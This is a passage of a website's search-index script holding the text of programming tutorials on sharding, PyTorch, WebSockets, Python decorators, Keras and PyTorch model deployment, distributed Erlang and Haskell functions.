sharding Geography-based sharding, or geosharding, also keeps related data together on a single shard, but in this case, the data is related by geography. This is essentially ranged sharding where the shard key contains geographic information and the shards themselves are geo-located.\nFor example, consider a dataset where each record contains a “country” field. In this case, we can both increase overall performance and decrease system latency by creating a shard for each country or region, and storing the appropriate data on that shard. This is a simple example, and there are many other ways to allocate your geoshards which are beyond the scope of this article.\nSummary linkWe’ve defined what sharding is, discussed when to use it, and explored different sharding architectures. Sharding is a great solution for applications with large data requirements and high-volume read/write workloads, but it does come with additional complexity. Consider whether the benefits outweigh the costs or whether there is a simpler solution before you begin implementation.\n"
            }
        );
    index.add(
            {
                id:  81 ,
                href: "\/tutorials\/docs\/pytorch\/pytorch\/pytorch_and_neural_networks\/",
                title: "Deep Dive into PyTorch: Autograd and Neural Networks",
                description: "Exploring Autograd and Neural Networks in PyTorch.",
                content: "Autograd: Automatic Differentiation in PyTorch linkPyTorch’s autograd is a powerful tool for automatically computing gradients of tensor operations. Understanding autograd is essential for training neural networks efficiently.\nHow Autograd Works linkAutograd works by automatically tracking operations performed on tensors and then using this information to compute gradients during backpropagation. When you perform operations on tensors with requires_grad=True, PyTorch builds a computational graph to track the operations. During the backward pass, gradients are computed using the chain rule of calculus and propagated back through the graph.\nLet’s illustrate this with an example:\nimport torch # Define tensors with requires_grad=True x = torch.tensor(2.0, requires_grad=True) y = torch.tensor(3.0, requires_grad=True) # Perform operations z = x * y + 2 # Compute gradients z.backward() print(x.grad) # Output: tensor(3.) print(y.grad) # Output: tensor(2.) In this example, x.grad will be 3.0 because the gradient of z with respect to x is 3. Similarly, y.grad will be 2.0 because the gradient of z with respect to y is 2.\nNeural Networks with PyTorch linkPyTorch provides a flexible and efficient framework for building neural networks. The torch.nn module allows you to define custom neural network architectures with ease.\nExample: Creating a Simple Neural Network link import torch import torch.nn as nn class SimpleNN(nn.Module): def __init__(self): super(SimpleNN, self).__init__() self.fc1 = nn.Linear(10, 50) self.relu = nn.ReLU() self.fc2 = nn.Linear(50, 1) def forward(self, x): x = self.fc1(x) x = self.relu(x) x = self.fc2(x) return x # Instantiate the network model = SimpleNN() Training a Neural Network linkOnce you have defined a neural network, you can train it using gradient descent optimization algorithms such as stochastic gradient descent (SGD) or Adam.\nExample: Training a Simple Neural Network link # Define loss function and optimizer criterion = nn.MSELoss() optimizer = torch.optim.SGD(model.parameters(), lr=0.01) # Training loop for epoch in range(num_epochs): # Forward pass outputs = model(inputs) loss = criterion(outputs, targets) # Backward pass and optimization optimizer.zero_grad() loss.backward() optimizer.step() # Print progress if (epoch+1) % 10 == 0: print(f'Epoch [{epoch+1}/{num_epochs}], Loss: {loss.item():.4f}') Conclusion linkAutograd and neural networks are fundamental components of PyTorch that enable you to build and train complex deep learning models. By leveraging autograd for automatic differentiation and defining custom neural network architectures, you can tackle a wide range of machine learning tasks effectively.\n"
            }
        );
    index.add(
            {
                id:  82 ,
                href: "\/tutorials\/docs\/pytorch\/pytorch\/tensors_in_pytorch\/",
                title: "Deep Dive into Tensors",
                description: "A comprehensive introduction to PyTorch for deep learning.",
                content: "Tensors are a specialized data structure that are very similar to arrays and matrices. In PyTorch, we use tensors to encode the inputs and outputs of a model, as well as the model’s parameters.\nTensors are similar to NumPy’s ndarrays, except that tensors can run on GPUs or other hardware accelerators. In fact, tensors and NumPy arrays can often share the same underlying memory, eliminating the need to copy data (see Bridge with NumPy). Tensors are also optimized for automatic differentiation (we’ll see more about that later in the Autograd section). If you’re familiar with ndarrays, you’ll be right at home with the Tensor API. If not, follow along!\nimport torch import numpy as np Initializing a Tensor linkTensors can be initialized in various ways. Take a look at the following examples:\nDirectly from data\nTensors can be created directly from data. The data type is automatically inferred.\ndata = [[1, 2],[3, 4]] x_data = torch.tensor(data) From a NumPy array\nTensors can be created from NumPy arrays (and vice versa - see Bridge with NumPy).\nnp_array = np.array(data) x_np = torch.from_numpy(np_array) From another tensor: The new tensor retains the properties (shape, datatype) of the argument tensor, unless explicitly overridden.\nx_ones = torch.ones_like(x_data) # retains the properties of x_data print(f\"Ones Tensor: \\n {x_ones} \\n\") x_rand = torch.rand_like(x_data, dtype=torch.float) # overrides the datatype of x_data print(f\"Random Tensor: \\n {x_rand} \\n\") Ones Tensor: tensor([[1, 1], [1, 1]]) Random Tensor: tensor([[0.8823, 0.9150], [0.3829, 0.9593]]) With random or constant values:\nshape is a tuple of tensor dimensions. In the functions below, it determines the dimensionality of the output tensor.\nshape = (2,3,) rand_tensor = torch.rand(shape) ones_tensor = torch.ones(shape) zeros_tensor = torch.zeros(shape) print(f\"Random Tensor: \\n {rand_tensor} \\n\") print(f\"Ones Tensor: \\n {ones_tensor} \\n\") print(f\"Zeros Tensor: \\n {zeros_tensor}\") Random Tensor: tensor([[0.3904, 0.6009, 0.2566], [0.7936, 0.9408, 0.1332]]) Ones Tensor: tensor([[1., 1., 1.], [1., 1., 1.]]) Zeros Tensor: tensor([[0., 0., 0.], [0., 0., 0.]]) Attributes of a Tensor linkTensor attributes describe their shape, datatype, and the device on which they are stored.\ntensor = torch.rand(3,4) print(f\"Shape of tensor: {tensor.shape}\") print(f\"Datatype of tensor: {tensor.dtype}\") print(f\"Device tensor is stored on: {tensor.device}\") Shape of tensor: torch.Size([3, 4]) Datatype of tensor: torch.float32 Device tensor is stored on: cpu Operations on Tensors linkOver 100 tensor operations, including arithmetic, linear algebra, matrix manipulation (transposing, indexing, slicing), sampling and more are comprehensively described here.\nEach of these operations can be run on the GPU (at typically higher speeds than on a CPU). If you’re using Colab, allocate a GPU by going to Runtime \u003e Change runtime type \u003e GPU.\nBy default, tensors are created on the CPU. We need to explicitly move tensors to the GPU using .to method (after checking for GPU availability). Keep in mind that copying large tensors across devices can be expensive in terms of time and memory!\n# We move our tensor to the GPU if available if torch.cuda.is_available(): tensor = tensor.to(\"cuda\") Try out some of the operations from the list. If you’re familiar with the NumPy API, you’ll find the Tensor API a breeze to use.\nStandard numpy-like indexing and slicing:\ntensor = torch.ones(4, 4) print(f\"First row: {tensor[0]}\") print(f\"First column: {tensor[:, 0]}\") print(f\"Last column: {tensor[..., -1]}\") tensor[:,1] = 0 print(tensor) First row: tensor([1., 1., 1., 1.]) First column: tensor([1., 1., 1., 1.]) Last column: tensor([1., 1., 1., 1.]) tensor([[1., 0., 1., 1.], [1., 0., 1., 1.], [1., 0., 1., 1.], [1., 0., 1., 1.]]) Joining tensors You can use torch.cat to concatenate a sequence of tensors along a given dimension. See also torch.stack, another tensor joining operator that is subtly different from torch.cat.\nt1 = torch.cat([tensor, tensor, tensor], dim=1) print(t1) tensor([[1., 0., 1., 1., 1., 0., 1., 1., 1., 0., 1., 1.], [1., 0., 1., 1., 1., 0., 1., 1., 1., 0., 1., 1.], [1., 0., 1., 1., 1., 0., 1., 1., 1., 0., 1., 1.], [1., 0., 1., 1., 1., 0., 1., 1., 1., 0., 1., 1.]]) Arithmetic operations\n# This computes the matrix multiplication between two tensors. y1, y2, y3 will have the same value # ``tensor.T`` returns the transpose of a tensor y1 = tensor @ tensor.T y2 = tensor.matmul(tensor.T) y3 = torch.rand_like(y1) torch.matmul(tensor, tensor.T, out=y3) # This computes the element-wise product. z1, z2, z3 will have the same value z1 = tensor * tensor z2 = tensor.mul(tensor) z3 = torch.rand_like(tensor) torch.mul(tensor, tensor, out=z3) tensor([[1., 0., 1., 1.], [1., 0., 1., 1.], [1., 0., 1., 1.], [1., 0., 1., 1.]]) Single-element tensors If you have a one-element tensor, for example by aggregating all values of a tensor into one value, you can convert it to a Python numerical value using item():\nagg = tensor.sum() agg_item = agg.item() print(agg_item, type(agg_item)) 12.0 "
            }
        );
    index.add(
            {
                id:  83 ,
                href: "\/tutorials\/docs\/system-design\/system-design\/web_sockets\/",
                title: "Deep Dive into WebSockets",
                description: "If you are looking to grow in you tech career and understand system design indepth, this guide is for you.",
                content: "WebSockets are a communication protocol that provides full-duplex communication channels over a single TCP connection, enabling real-time, event-driven communication between a client and a server. Unlike traditional HTTP, which follows a request-response model, WebSockets allow bi-directional communication. This means both the client and the server can send data to each other at any time without continuous polling.\nUses of WebSockets linkWebSockets are ideal for applications requiring instant updates, such as:\nReal-time chat and messaging Multiplayer games Live sports scores Financial tickers Collaborative editing In traditional HTTP, the client must continuously poll the server to check for updates, which increases latency and decreases efficiency. WebSockets, however, establish a persistent connection, allowing real-time data transfer without the need for continuous polling. This results in instant updates and a more seamless user experience.\nFor instance, in a chat application, messages can be instantly delivered to all users without refreshing the page or making frequent HTTP requests. This provides a smoother and more efficient user experience.\nExamples of WebSocket Use Cases link Real-time Collaboration: Tools like Google Docs use WebSockets to allow multiple users to edit documents simultaneously, with changes appearing instantly. Live Streaming: Platforms like Twitch and YouTube Live use WebSockets to deliver live video content with minimal latency. Online Gaming: Multiplayer games use WebSockets to manage real-time interactions between players. Financial Services: Real-time stock tickers and trading platforms use WebSockets to provide up-to-the-moment data. Drawbacks of WebSockets linkDespite their benefits, WebSockets have some drawbacks:\nBrowser Support linkWhile most modern browsers support WebSockets, some older browsers do not. This can limit your application’s reach and necessitate fallback mechanisms.\nProxy and Firewall Limitations linkSome proxy servers and firewalls may block or interfere with WebSocket connections, causing connectivity issues, especially in secured corporate or restricted network environments.\nScalability linkMaintaining a persistent connection for each client can strain server resources, especially with many concurrent connections. Proper load balancing and resource management techniques are essential for scalability.\nStateful Nature linkWebSockets are stateful, meaning the server must maintain the connection state for each client. This leads to increased memory usage and potential scalability challenges.\nSecurity Considerations linkPersistent connections require robust security measures to protect against vulnerabilities like cross-site scripting (XSS) and cross-site request forgery (CSRF). Secure WebSocket connections (wss://) using SSL/TLS encryption should be implemented to ensure data privacy and integrity.\nConnection Management linkIf a WebSocket connection is lost, there are no built-in load balancing or reconnection mechanisms. Fallback options like HTTP streaming or long polling may be necessary for environments where WebSockets are not supported.\nPresence Detection linkFeatures like presence detection are challenging with WebSockets because disconnections can be hard to detect.\nWebSockets vs. HTTP vs. Polling linkHTTP Connections vs. WebSockets linkHTTP follows a request-response model, where the client sends requests, and the server responds. This model is suitable for many use cases but is inefficient for real-time applications due to the need for continuous polling, which increases latency and bandwidth usage.\nShort Polling vs. WebSockets linkShort polling involves the client repeatedly sending requests to the server for updates, which is resource-intensive and inefficient.\nLong Polling vs. WebSockets linkLong polling keeps a connection open until the server has new data to send. While more efficient than short polling, it still requires holding connections open, which can be resource-intensive.\nWebSockets Advantages linkWebSockets provide a more efficient solution for real-time communication by establishing a persistent connection that allows data to flow both ways, reducing latency and bandwidth usage.\nHow WebSockets Work linkWebSockets run over the TCP protocol. The connection is established through an initial HTTP request and then upgraded to a WebSocket connection. The client and server can then communicate asynchronously, sending and receiving data at any time.\nKey Points: link Initial Handshake: An HTTP request/response pair initiates the connection, which is then upgraded to WebSockets using the WebSocket protocol. Bi-Directional Communication: Once established, the connection allows for continuous, full-duplex communication. URI Scheme: WebSocket connections use a “ws:” or “wss:” scheme similar to HTTP’s “http:” or “https:”. WebSocket Libraries linkSeveral libraries facilitate WebSocket implementation across different programming languages:\nSocket.IO: Supports multiple programming languages and provides features like automatic reconnection and fallback options. SignalR: Developed by Microsoft, it supports .NET, JavaScript, and other languages, offering automatic connection management and scalability. SockJS: A JavaScript library that provides WebSocket-like objects in the browser with fallback mechanisms for unsupported servers. WS: A lightweight WebSocket implementation for Node.js. Django Channels: Extends Django for real-time applications, supporting WebSockets and other protocols. Reasons to Consider WebSockets link Real-time Updates: Ideal for applications requiring instantaneous data updates. HTML5 Compliant: Supported by all modern web browsers. Cross-Platform Compatibility: Works across Android, iOS, web, and desktop platforms. Scalability: Supports multiple simultaneous connections. Proxy and Firewall Compatibility: Streams data through many proxies and firewalls. Open-Source Resources: Numerous open-source libraries and tutorials are available. By leveraging WebSockets, developers can build more interactive, efficient, and responsive applications, providing a superior user experience in real-time scenarios.\n"
            }
        );
    index.add(
            {
                id:  84 ,
                href: "\/tutorials\/docs\/python\/python\/python_decorators\/",
                title: "Demystifying Python Decorators: Enhancing Functionality with Decorators",
                description: "Unlock the power of decorators in Python to modify and enhance the functionality of functions and methods dynamically. This guide delves into the principles of decorators and shows you how to create them with practical, real-world examples.",
                content: "Introduction linkDecorators in Python are a very powerful and useful tool, allowing programmers to modify the behavior of a function or class. Decorators are typically used to extend or alter the behavior of functions or methods without permanently modifying them. They provide a flexible way to “wrap” functions with additional code.\nWhat are Decorators? linkA decorator in Python is essentially a function that takes another function and extends its functionality, often doing some processing before or after the execution of the original function.\nBasic Concept of a Decorator link def decorator(func): def wrapper(): print(\"Something is happening before the function is called.\") func() print(\"Something is happening after the function is called.\") return wrapper def say_hello(): print(\"Hello!\") # Apply the decorator say_hello = decorator(say_hello) say_hello() In this example, decorator is a function that takes another function func as an argument. The wrapper function is defined inside the decorator and wraps the functionality of the func function by adding some code before and after its call.\nUsing the @ Syntax for Decorators linkPython provides a simpler way to apply decorators using the @ symbol, which is placed above the definition of the function to be decorated.\nExample Using @ link @decorator def say_goodbye(): print(\"Goodbye!\") say_goodbye() The @decorator syntax is just a shorthand for say_goodbye = decorator(say_goodbye), making the code cleaner and more readable.\nBuilding a Simple Decorator linkLet’s create a simple decorator that logs the execution time of any function it decorates.\nExecution Time Decorator link import time def timer(func): def wrapper(*args, **kwargs): start_time = time.time() result = func(*args, **kwargs) end_time = time.time() print(f\"Executing {func.__name__} took {end_time - start_time} seconds.\") return result return wrapper @timer def long_running_task(): for _ in range(1000000): pass long_running_task() This timer decorator measures the time it takes to execute the function long_running_task. The wrapper function uses *args and **kwargs to handle any number of arguments passed to the function. It calculates the start time and end time around the function call, and then prints the duration.\nConclusion linkDecorators are a valuable feature in Python, offering an elegant and expressive way to modify functions’ behavior dynamically. Understanding and utilizing decorators can lead to cleaner, more efficient, and more maintainable code, especially in large-scale applications. This guide has introduced the concept of decorators, shown how to apply them, and demonstrated how to create a practical decorator for measuring execution time.\n"
            }
        );
    index.add(
            {
                id:  85 ,
                href: "\/tutorials\/docs\/keras\/keras\/deploying_keras_models\/",
                title: "Deploying Keras Models",
                description: "Deploying a model is key in ensuring that other people can use it",
                content: "This tutorial covers the process of deploying Keras models, including exporting models, deploying on different platforms, and optimizing models for deployment.\nExporting Models linkExporting models is the first step towards deploying them. Keras models can be saved and loaded in different formats.\nSaving Models linkKeras models can be saved in two formats: HDF5 and SavedModel.\nHDF5 Format link model.save('model.h5') SavedModel Format link model.save('saved_model/') Loading Models linkModels saved in HDF5 or SavedModel format can be loaded back into Keras.\nLoading from HDF5 link from keras.models import load_model model = load_model('model.h5') Loading from SavedModel link from keras.models import load_model model = load_model('saved_model/') Model Deployment on Different Platforms linkKeras models can be deployed on various platforms for different use cases.\nTensorFlow Serving linkTensorFlow Serving is a flexible, high-performance serving system for machine learning models designed for production environments.\nExporting the Model for TensorFlow Serving link import tensorflow as tf model.save('saved_model/', save_format='tf') Serving the Model link tensorflow_model_server --rest_api_port=8501 --model_name=my_model --model_base_path=\"/path/to/saved_model/\" Flask linkFlask is a lightweight WSGI web application framework in Python that can be used to deploy machine learning models.\nCreating a Flask App link from flask import Flask, request, jsonify from keras.models import load_model import numpy as np app = Flask(__name__) model = load_model('model.h5') @app.route('/predict', methods=['POST']) def predict(): data = request.json prediction = model.predict(np.array(data['input'])) return jsonify({'prediction': prediction.tolist()}) if __name__ == '__main__': app.run(port=5000, debug=True) FastAPI linkFastAPI is a modern, fast (high-performance), web framework for building APIs with Python 3.7+ based on standard Python type hints.\nCreating a FastAPI App link from fastapi import FastAPI from pydantic import BaseModel from keras.models import load_model import numpy as np app = FastAPI() model = load_model('model.h5') class PredictionRequest(BaseModel): input: list @app.post('/predict') def predict(request: PredictionRequest): data = np.array(request.input) prediction = model.predict(data) return {'prediction': prediction.tolist()} if __name__ == '__main__': import uvicorn uvicorn.run(app, host='0.0.0.0', port=8000) TensorFlow Lite linkTensorFlow Lite is an open-source deep learning framework for on-device inference.\nConverting a Model to TensorFlow Lite link import tensorflow as tf model = tf.keras.models.load_model('model.h5') converter = tf.lite.TFLiteConverter.from_keras_model(model) tflite_model = converter.convert() with open('model.tflite', 'wb') as f: f.write(tflite_model) Running Inference with TensorFlow Lite link import numpy as np import tensorflow as tf interpreter = tf.lite.Interpreter(model_path='model.tflite') interpreter.allocate_tensors() input_details = interpreter.get_input_details() output_details = interpreter.get_output_details() input_data = np.array([[...]], dtype=np.float32) interpreter.set_tensor(input_details[0]['index'], input_data) interpreter.invoke() output_data = interpreter.get_tensor(output_details[0]['index']) print(output_data) Model Optimization for Deployment linkOptimizing models for deployment can improve performance, reduce latency, and decrease resource consumption.\nModel Quantization linkQuantization reduces the precision of the numbers used to represent your model’s parameters, which can result in smaller model size and faster inference.\nPost-Training Quantization link converter = tf.lite.TFLiteConverter.from_keras_model(model) converter.optimizations = [tf.lite.Optimize.DEFAULT] tflite_model = converter.convert() Model Pruning linkPruning removes weights that contribute less to the output, which can reduce model size and improve inference speed.\nApplying Pruning link import tensorflow_model_optimization as tfmot prune_low_magnitude = tfmot.sparsity.keras.prune_low_magnitude pruning_params = { 'pruning_schedule': tfmot.sparsity.keras.PolynomialDecay( initial_sparsity=0.0, final_sparsity=0.5, begin_step=0, end_step=end_step ) } model_for_pruning = prune_low_magnitude(model, **pruning_params) model_for_pruning.compile(optimizer='adam', loss='binary_crossentropy', metrics=['accuracy']) model_for_pruning.fit(x_train, y_train, epochs=2) TensorFlow Model Optimization Toolkit linkThe TensorFlow Model Optimization Toolkit provides a suite of techniques for optimizing machine learning models for deployment and execution.\nApplying Optimization link import tensorflow_model_optimization as tfmot model = tf.keras.models.load_model('model.h5') # Pruning prune_low_magnitude = tfmot.sparsity.keras.prune_low_magnitude pruning_params = {'pruning_schedule': tfmot.sparsity.keras.PolynomialDecay(initial_sparsity=0.0, final_sparsity=0.5, begin_step=0, end_step=end_step)} model = prune_low_magnitude(model, **pruning_params) # Quantization-aware training quantize_model = tfmot.quantization.keras.quantize_model model = quantize_model(model) model.compile(optimizer='adam', loss='binary_crossentropy', metrics=['accuracy']) model.fit(x_train, y_train, epochs=2) By following these steps, you can effectively deploy and optimize your Keras models for various platforms and applications.\n"
            }
        );
    index.add(
            {
                id:  86 ,
                href: "\/tutorials\/docs\/pytorch\/pytorch\/deploying_pytorch_in_python\/",
                title: "Deploying PyTorch in Python via a REST API with Flask",
                description: "A comprehensive introduction to PyTorch for deep learning.",
                content: "In this tutorial, we will deploy a PyTorch model using Flask and expose a REST API for model inference. In particular, we will deploy a pretrained DenseNet 121 model which detects the image.\nAPI Definition linkWe will first define our API endpoints, the request and response types. Our API endpoint will be at /predict which takes HTTP POST requests with a file parameter which contains the image. The response will be of JSON response containing the prediction:\n{\"class_id\": \"n02124075\", \"class_name\": \"Egyptian_cat\"} Dependencies linkInstall the required dependencies by running the following command:\npip install Flask==2.0.1 torchvision==0.10.0 Simple Web Server linkFollowing is a simple web server, taken from Flask’s documentation\nfrom flask import Flask app = Flask(__name__) @app.route('/') def hello(): return 'Hello World!' We will also change the response type, so that it returns a JSON response containing ImageNet class id and name. The updated app.py file will be now:\nfrom flask import Flask, jsonify app = Flask(__name__) @app.route('/predict', methods=['POST']) def predict(): return jsonify({'class_id': 'IMAGE_NET_XXX', 'class_name': 'Cat'}) Inference linkIn the next sections we will focus on writing the inference code. This will involve two parts, one where we prepare the image so that it can be fed to DenseNet and next, we will write the code to get the actual prediction from the model.\nPreparing the image linkDenseNet model requires the image to be of 3 channel RGB image of size 224 x 224. We will also normalize the image tensor with the required mean and standard deviation values. You can read more about it here.\nWe will use transforms from torchvision library and build a transform pipeline, which transforms our images as required. You can read more about transforms here.\nimport io import torchvision.transforms as transforms from PIL import Image def transform_image(image_bytes): my_transforms = transforms.Compose([transforms.Resize(255), transforms.CenterCrop(224), transforms.ToTensor(), transforms.Normalize( [0.485, 0.456, 0.406], [0.229, 0.224, 0.225])]) image = Image.open(io.BytesIO(image_bytes)) return my_transforms(image).unsqueeze(0) The above method takes image data in bytes, applies the series of transforms and returns a tensor. To test the above method, read an image file in bytes mode (first replacing ../_static/img/sample_file.jpeg with the actual path to the file on your computer) and see if you get a tensor back:\nwith open(\"../_static/img/sample_file.jpeg\", 'rb') as f: image_bytes = f.read() tensor = transform_image(image_bytes=image_bytes) print(tensor) Prediction linkNow will use a pretrained DenseNet 121 model to predict the image class. We will use one from torchvision library, load the model and get an inference. While we’ll be using a pretrained model in this example, you can use this same approach for your own models. See more about loading your models in this tutorial.\nfrom torchvision import models # Make sure to set `weights` as `'IMAGENET1K_V1'` to use the pretrained weights: model = models.densenet121(weights='IMAGENET1K_V1') # Since we are using our model only for inference, switch to `eval` mode: model.eval() def get_prediction(image_bytes): tensor = transform_image(image_bytes=image_bytes) outputs = model.forward(tensor) _, y_hat = outputs.max(1) return y_hat The tensor y_hat will contain the index of the predicted class id. However, we need a human readable class name. For that we need a class id to name mapping. Download this file as imagenet_class_index.json and remember where you saved it (or, if you are following the exact steps in this tutorial, save it in tutorials/_static). This file contains the mapping of ImageNet class id to ImageNet class name. We will load this JSON file and get the class name of the predicted index.\nimport json imagenet_class_index = json.load(open('../_static/imagenet_class_index.json')) def get_prediction(image_bytes): tensor = transform_image(image_bytes=image_bytes) outputs = model.forward(tensor) _, y_hat = outputs.max(1) predicted_idx = str(y_hat.item()) return imagenet_class_index[predicted_idx] Before using imagenet_class_index dictionary, first we will convert tensor value to a string value, since the keys in the imagenet_class_index dictionary are strings. We will test our above method:\nwith open(\"../_static/img/sample_file.jpeg\", 'rb') as f: image_bytes = f.read() print(get_prediction(image_bytes=image_bytes)) You should get a response like this:\n['n02124075', 'Egyptian_cat'] The first item in array is ImageNet class id and second item is the human readable name.\nIntegrating the model in our API Server linkIn this final part we will add our model to our Flask API server. Since our API server is supposed to take an image file, we will update our predict method to read files from the requests:\nfrom flask import request @app.route('/predict', methods=['POST']) def predict(): if request.method == 'POST': # we will get the file from the request file = request.files['file'] # convert that to bytes img_bytes = file.read() class_id, class_name = get_prediction(image_bytes=img_bytes) return jsonify({'class_id': class_id, 'class_name': class_name}) import io import json from torchvision import models import torchvision.transforms as transforms from PIL import Image from flask import Flask, jsonify, request app = Flask(__name__) imagenet_class_index = json.load(open('/imagenet_class_index.json')) model = models.densenet121(weights='IMAGENET1K_V1') model.eval() def transform_image(image_bytes): my_transforms = transforms.Compose([transforms.Resize(255), transforms.CenterCrop(224), transforms.ToTensor(), transforms.Normalize( [0.485, 0.456, 0.406], [0.229, 0.224, 0.225])]) image = Image.open(io.BytesIO(image_bytes)) return my_transforms(image).unsqueeze(0) def get_prediction(image_bytes): tensor = transform_image(image_bytes=image_bytes) outputs = model.forward(tensor) _, y_hat = outputs.max(1) predicted_idx = str(y_hat.item()) return imagenet_class_index[predicted_idx] @app.route('/predict', methods=['POST']) def predict(): if request.method == 'POST': file = request.files['file'] img_bytes = file.read() class_id, class_name = get_prediction(image_bytes=img_bytes) return jsonify({'class_id': class_id, 'class_name': class_name}) if __name__ == '__main__': app.run() FLASK_ENV=development FLASK_APP=app.py flask run library to send a POST request to our app:\nimport requests resp = requests.post(\"http://localhost:5000/predict\", files={\"file\": open('/cat.jpg','rb')}) Printing resp.json() will now show the following:\n{\"class_id\": \"n02124075\", \"class_name\": \"Egyptian_cat\"} The server we wrote is quite trivial and may not do everything you need for your production application. So, here are some things you can do to make it better:\nThe endpoint /predict assumes that always there will be a image file in the request. This may not hold true for all requests. Our user may send image with a different parameter or send no images at all. The user may send non-image type files too. Since we are not handling errors, this will break our server. Adding an explicit error handing path that will throw an exception would allow us to better handle the bad inputs Even though the model can recognize a large number of classes of images, it may not be able to recognize all images. Enhance the implementation to handle cases when the model does not recognize anything in the image. We run the Flask server in the development mode, which is not suitable for deploying in production. You can check out this tutorial for deploying a Flask server in production. You can also add a UI by creating a page with a form which takes the image and displays the prediction. Check out the demo of a similar project and its source code. In this tutorial, we only showed how to build a service that could return predictions for a single image at a time. We could modify our service to be able to return predictions for multiple images at once. In addition, the service-streamer library automatically queues requests to your service and samples them into mini-batches that can be fed into your model. You can check out this tutorial. Finally, we encourage you to check out our other tutorials on deploying PyTorch models linked-to at the top of the page. "
            }
        );
    index.add(
            {
                id:  87 ,
                href: "\/tutorials\/docs\/erlang\/erlang\/distributed_programming_in_erlang\/",
                title: "Distributed Programming",
                description: "Distributed programming involves writing programs designed to run on networks of computers, coordinating their activities through message passing. Erlang is well-suited for distributed programming due to its built-in support for creating and managing distributed systems.\nWhy Write Distributed Applications? linkThere are several reasons to write distributed applications:\nPerformance linkBy running different parts of a program in parallel on different machines, we can significantly improve performance.\nReliability linkWe can achieve fault tolerance by distributing the system across multiple machines.",
                content: "Distributed programming involves writing programs designed to run on networks of computers, coordinating their activities through message passing. Erlang is well-suited for distributed programming due to its built-in support for creating and managing distributed systems.\nWhy Write Distributed Applications? linkThere are several reasons to write distributed applications:\nPerformance linkBy running different parts of a program in parallel on different machines, we can significantly improve performance.\nReliability linkWe can achieve fault tolerance by distributing the system across multiple machines. If one machine fails, the system can continue running on another machine.\nScalability linkAs applications grow, they may outgrow the capabilities of a single machine. By adding more machines, we can increase the capacity of the system without major changes to the application architecture.\nCentral Concept: The Node linkIn distributed Erlang, the central concept is the node. A node is a self-contained Erlang runtime system, complete with its own virtual machine, address space, and set of processes.\nMethods for Distributed Programming linkHere are some essential methods for distributed programming in Erlang:\nspawn\nUsed to create a new process and initialize it. node\nUsed to determine the value of the node on which the process is running. spawn on Node\nUsed to create a new process on a specific node. is_alive\nReturns true if the local node is alive and can be part of a distributed system. spawnlink\nUsed to create a new process link on a node. Example: Setting Up Distributed Erlang Nodes linkLet’s go through an example of setting up a distributed Erlang system.\n1. Starting Nodes linkFirst, we need to start Erlang nodes. Open two terminal windows and start two Erlang shells with different node names:\nNode 1:\n$ erl -sname node1@localhost Node 2:\n$ erl -sname node2@localhost 2. Making Nodes Aware of Each Other linkMake the nodes aware of each other using the net_adm:ping/1 function:\nNode 1 Shell:\n(node1@localhost)1\u003e net_adm:ping(node2@localhost). pong Node 2 Shell:\n(node2@localhost)1\u003e net_adm:ping(node1@localhost). pong 3. Creating a Process on a Remote Node linkCreate a module distributed_example.erl:\n-module(distributed_example). -export([start/0, remote_hello/0]). remote_hello() -\u003e io:format(\"Hello from ~p~n\", [node()]). start() -\u003e spawn(node2@localhost, distributed_example, remote_hello, []). 4. Running the Example linkCompile and run the example from Node 1:\n(node1@localhost)2\u003e c(distributed_example). {ok,distributed_example} (node1@localhost)3\u003e distributed_example:start(). \u003c0.55.0\u003e Check the output on Node 2 to see the message from remote_hello/0.\n5. Checking Node Status linkYou can check if a node is alive using node/0 and is_alive/0:\nNode 1 Shell:\n(node1@localhost)4\u003e node(). node1@localhost (node1@localhost)5\u003e node2@localhost. true Conclusion linkErlang’s built-in support for distributed programming makes it a powerful tool for creating scalable, reliable, and high-performance applications. By understanding the key methods and concepts, you can leverage Erlang to build robust distributed systems.\n"
            }
        );
    index.add(
            {
                id:  88 ,
                href: "\/tutorials\/docs\/haskell\/haskell\/diving-deeper-into-haskell-functions\/",
                title: "Diving Deeper into Haskell Functions",
                description: "Explore the advanced functionalities of Haskell functions including pure functions, higher-order functions like map, filter, and fold, and the concepts of currying and partial application.",
                content: "Introduction:\nWelcome back to our exploration of Haskell, a language that shines brightly in the realm of functional programming due to its elegant handling of functions. In this session, we dive deeper into Haskell’s approach to functions, focusing on pure functions, higher-order functions, and the intriguing concepts of currying and partial application. These advanced features empower developers to write more concise, flexible, and maintainable code.\nPure Functions and Side Effects\nConcept of Pure Functions:\nIn Haskell, pure functions are a fundamental concept. These functions guarantee that the same inputs always result in the same outputs, with no side effects such as modifying a global state or changing a variable outside its scope. This characteristic is crucial for several reasons:\nReferential Transparency: You can replace a function call with its result without changing the program’s behavior. Ease of Reasoning: Pure functions simplify understanding and reasoning about your code, as each piece behaves predictably and independently. Example of a Pure Function:\nsquare :: Int -\u003e Int square x = x * x Managing Side Effects:\nHaskell manages side effects using the IO type, which encapsulates any interactions with the external world, keeping the purity of your functions intact. This separation of pure and impure parts is what makes Haskell particularly powerful for tasks where predictability and correctness are paramount.\nHigher-Order Functions: Map, Filter, and Fold\nTransforming Data with Higher-Order Functions:\nHigher-order functions are a staple in functional programming, allowing you to abstract common patterns of computation by taking functions as arguments or returning them as results.\nUsing map: Transform elements of a list without explicit recursion. Using filter: Extract elements that meet certain criteria. Using fold: Reduce a collection to a single value by accumulating results using a specified function. Examples of Higher-Order Functions:\n-- Applies a function to increase each element by one incrementAll :: [Int] -\u003e [Int] incrementAll = map (+1) -- Retrieves only the odd numbers from a list filterOdds :: [Int] -\u003e [Int] filterOdds = filter odd -- Computes the total sum of a list of integers totalSum :: [Int] -\u003e Int totalSum = foldl (+) 0 Currying and Partial Application\nUnderstanding Currying:\nCurrying transforms a function that takes multiple arguments into a sequence of functions each with a single argument. This transformation is not just a theoretical concept in Haskell—it’s how functions fundamentally work.\nBenefits of Currying:\nModularity: You can build more generalized functions and adapt them to specific situations by partial application. Code Reusability: Currying helps in creating configurable and reusable code blocks that can adapt to various needs. Examples of Currying and Partial Application:\n-- A curried function definition multiply :: Int -\u003e Int -\u003e Int multiply x y = x * y -- Applying the function partially double :: Int -\u003e Int double = multiply 2 -- Using partial application in practice addFive :: Int -\u003e Int addFive = (+5) Advanced Functional Techniques\nLeveraging Function Composition: Haskell supports function composition, allowing you to combine multiple functions into a single function. This is incredibly useful for creating pipelines of functions where the output of one function becomes the input to another.\n-- Compose functions to first add five, then square the result addFiveAndSquare :: Int -\u003e Int addFiveAndSquare = square . addFive Conclusion:\nExploring the deeper functionalities of Haskell’s functions opens up a world of clean, elegant, and efficient coding possibilities. By mastering pure functions, higher-order functions, and currying, you can harness the full potential of Haskell to write programs that are not only easy to understand and maintain but also robust and flexible. As you continue to 